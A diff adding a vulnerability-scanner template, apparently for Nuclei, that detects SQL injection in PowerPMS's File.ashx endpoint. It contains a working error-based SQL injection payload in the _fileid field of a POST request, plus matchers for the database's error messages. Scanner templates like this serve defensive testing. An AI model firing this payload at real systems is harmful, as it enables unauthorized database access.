@@ -1,0 +1,42 @@
+id: powerpms-file-ashx-sqli
+info:
+  name: PowerPMS File.ashx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects a SQL injection vulnerability in PowerPMS's File.ashx endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "/PowerPlat/Control/File.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      NoCheckSession=true&ServerOperatorType=OpenRecord&_fileid='and+1<sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--&_type=ftp&action=topdf&sessionid=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+          - "\"success\":false"
+          - "\"detail\":"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
